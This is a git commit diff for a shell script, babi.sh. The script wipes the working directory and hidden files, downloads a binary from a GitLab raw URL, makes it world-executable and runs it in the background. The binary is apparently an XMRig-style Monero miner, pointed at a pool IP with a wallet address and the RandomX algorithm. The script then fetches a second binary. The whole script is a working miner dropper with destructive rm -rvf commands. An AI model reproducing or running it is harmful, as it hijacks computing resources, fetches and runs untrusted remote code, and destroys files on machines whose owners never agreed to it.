1ac0392afa337297267d5da608bd89ffde253b19
MJVideo <majapahlevi@gmail.com>
2024-02-20 15:42:51 +0000

    Update babi.sh

--- babi.sh
+++ babi.sh
@@ -1,13 +1,13 @@
 #!/bin/bash
 rm -rvf * 
-rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash* .majza*
+rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash* .des* .majza*
 rm -R *
 mkdir .des
 cd .des
 rm -R *
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/b
-chmod 777 b && ./b -o 161.35.141.255:80 -u amyKwSEvRSVaTi1UiyKnrk9pQWasrEeX3ApiMtzFFfUL8Y8HAfaHX6bRnc9XjZnfUhVccifsw1FCx32ogbB2gWUN1NxxLdd7jc -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1 &&
+chmod 777 b && ./b -o 161.35.141.255:80 -u amyKwSEvRSVaTi1UiyKnrk9pQWasrEeX3ApiMtzFFfUL8Y8HAfaHX6bRnc9XjZnfUhVccifsw1FCx32ogbB2gWUN1NxxLdd7jc -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1 &
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.84
 chmod 777 lol1.84
